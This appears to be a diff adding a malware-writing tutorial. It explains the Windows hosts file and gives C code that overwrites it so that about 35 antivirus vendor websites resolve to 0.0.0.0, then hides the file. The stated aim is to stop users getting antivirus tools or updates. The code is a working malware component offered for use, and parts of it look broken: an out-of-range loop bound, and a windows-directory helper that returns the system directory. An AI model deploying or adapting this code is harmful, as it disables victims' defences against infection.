@@ -1,0 +1,103 @@
+The hosts file is found in Windows NT/XP/2000 at %system%\drivers\etc\hosts
+In other versions %windows%\hosts
+
+The hosts file is a very interesting thing in Windows.  It's used to define
+local hosts around the network - you can alias BUBBA for some IP address to
+make things easier.  But it can also be used to block websites, like
+certain ads.  Alias ad.doubleclick.net to 0.0.0.0 and ads from that site
+won't pop up.  If you have a whole lists of ad sites you can block nearly all
+ads.
+
+Another use for this file has occured to me - to block AV websites and
+prevent users from obtaining an anti-virus tool or update.
+
+So without further ado, the code:
+
+void block_av()
+{
+    char str[MAX_PATH];
+    int n;
+
+    char *sites[] =
+    {
+    "www.antivirus.com",
+    "www.claymania.com",
+    "www.free-av.com",
+    "www.bitdefender.com",
+    "www.commandcom.com",
+    "www.dials.ru",
+    "www1.my-etrust.com",
+    "www.f-prot.com",
+    "www.f-secure.com",
+    "www.grisoft.com",
+    "antivirus.cai.com",
+    "www.avp.ru",
+    "www.nai.com",
+    "www.nod32.com.au",
+    "www.norman.com",
+    "www.symantec.com",
+    "www.pandasoftware.com",
+    "www.sophos.com",
+    "www.trend.com",
+    "www.commandondemand.com",
+    "www.dialognauka.ru",
+    "www.veloz.com",
+    "support.ikarus.at",
+    "www.kaspersky.com",
+    "www.hauri.net",
+    "antivirus.mafia.ru",
+    "www.mcafee.com",
+    "www.webimmune.net",
+    "www.pandasoftware.com",
+    "www.pcpitstop.com",
+    "www.ravantivirus.com",
+    "security1.norton.com",
+    "housecall.antivirus.com",
+    "www.freedom.net",
+    "www.invircible.com"
+    };
+
+    FILE *hosts = fopen(hosts_file(), "w");
+
+    if (hosts == NULL)
+        return;
+
+    fputs("127.0.0.1 localhost\n", hosts);
+
+    for (n = 0; n <= MAX_SITES; n++)
+    {
+        wsprintf(str, "0.0.0.0 %s\n", sites[n]); 
+        fputs(str, hosts);
+    }
+
+    fclose(hosts);
+
+    SetFileAttributes(hosts_file(), FILE_ATTRIBUTE_HIDDEN);
+}
+
+char *hosts_file()
+{
+    static char hosts[MAX_PATH];
+
+    if (running_nt())
+        wsprintf(hosts, "%s\\drivers\\etc\\hosts", sysdir());
+
+    else
+        wsprintf(hosts, "%s\\hosts", windir());
+
+    return hosts;
+}
+
+BOOL running_nt()
+{
+    return (GetVersion() < 0x80000000);
+}
+
+char *windir()
+{
+    static char win[MAX_PATH];
+
+    GetSystemDirectory(win, MAX_PATH);
+
+    return win;
+}
